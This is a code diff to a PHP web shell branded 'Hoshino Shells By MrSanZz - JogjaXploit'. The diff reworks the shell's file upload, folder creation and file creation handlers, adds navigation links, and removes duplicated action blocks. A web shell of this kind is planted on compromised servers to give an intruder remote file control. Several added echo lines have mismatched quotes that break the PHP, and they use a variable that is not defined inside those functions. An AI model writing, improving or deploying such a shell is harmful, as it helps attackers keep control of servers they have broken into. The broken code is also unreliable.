@@ -107,18 +107,18 @@ function uploadFile($path) {
 
         // Check if file already exists
         if (file_exists($target_file)) {
-            echo "Sorry, file already exists.";
+            echo 'Sorry, file already exists. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
             $uploadOk = 0;
         }
 
         // Check if $uploadOk is set to 0 by an error
         if ($uploadOk == 0) {
-            echo "Sorry, your file was not uploaded.";
+            echo 'Sorry, your file was not uploaded. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
         } else {
             if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
-                echo "The file " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . " has been uploaded.";
+                echo "The file " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . ' has been uploaded. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
             } else {
-                echo "Sorry, there was an error uploading your file.";
+                echo 'Sorry, there was an error uploading your file. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
             }
         }
     }
@@ -128,9 +128,9 @@ function createNewFolder($path, $folderName) {
     $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
     if (!file_exists($newFolder)) {
         mkdir($newFolder, 0777, true);
-        echo "Folder '" . htmlspecialchars($folderName) . "' created successfully.";
+        echo 'Folder "' . htmlspecialchars($folderName) . '" created successfully. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     } else {
-        echo "Folder '" . htmlspecialchars($folderName) . "' already exists.";
+        echo 'Folder "' . htmlspecialchars($folderName) . '" already exists. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     }
 }
 
@@ -139,31 +139,34 @@ function createNewFile($path, $fileName) {
     if (!file_exists($newFile)) {
         $fp = fopen($newFile, 'w');
         fclose($fp);
-        echo "File '" . htmlspecialchars($fileName) . "' created successfully.";
+        echo 'File '" . htmlspecialchars($fileName) . "' created successfully. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     } else {
-        echo "File '" . htmlspecialchars($fileName) . "' already exists.";
+        echo 'File '" . htmlspecialchars($fileName) . "' already exists. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     }
 }
 
 // Handle actions
 if ($action === 'upload') {
     uploadFile($path);
+    exit;
 }
 
 if ($action === 'create_folder') {
     if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
         createNewFolder($path, $_POST['folder_name']);
     } else {
-        echo "Folder name cannot be empty.";
+        echo 'Folder name cannot be empty. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     }
+    exit;
 }
 
 if ($action === 'create_file') {
     if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
         createNewFile($path, $_POST['file_name']);
     } else {
-        echo "File name cannot be empty.";
+        echo 'File name cannot be empty. <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
     }
+    exit;
 }
 
 if ($action === 'edit' && !empty($file)) {
@@ -207,35 +210,12 @@ if ($action === 'rename' && !empty($file)) {
     }
     exit;
 }
-
-if ($action === 'upload') {
-    uploadFile($path);
-    exit;
-}
-
-if ($action === 'create_folder') {
-    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
-        createNewFolder($path, $_POST['folder_name']);
-    } else {
-        echo "Folder name cannot be empty.";
-    }
-    exit;
-}
-
-if ($action === 'create_file') {
-    if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
-        createNewFile($path, $_POST['file_name']);
-    } else {
-        echo "File name cannot be empty.";
-    }
-    exit;
-}
 ?>
 
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hoshino Shells</title>
+    <title>Hoshino Shells!.</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -306,28 +286,25 @@ if ($action === 'create_file') {
     </style>
 </head>
 <body>
-    <h1>Hoshino Shells By MrSanZz - JogjaXploit</h1>
+    <h1>Hoshino Shells - By MrSanZz. JogjaXploit</h1>
 
     <!-- Action Buttons -->
     <div class="action-buttons">
         <!-- Upload File Form -->
-        <form method="post" enctype="multipart/form-data">
+        <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($path); ?>">
             <input type="file" name="uploaded_file">
-            <input type="hidden" name="action" value="upload">
             <input type="submit" value="Upload File">
         </form>
 
         <!-- Create New Folder Form -->
-        <form method="post">
+        <form method="post" action="?action=create_folder&path=<?php echo urlencode($path); ?>">
             <input type="text" name="folder_name" placeholder="New Folder Name">
-            <input type="hidden" name="action" value="create_folder">
             <input type="submit" value="Create Folder">
         </form>
 
         <!-- Create New File Form -->
-        <form method="post">
+        <form method="post" action="?action=create_file&path=<?php echo urlencode($path); ?>">
             <input type="text" name="file_name" placeholder="New File Name">
-            <input type="hidden" name="action" value="create_file">
             <input type="submit" value="Create File">
         </form>
     </div>
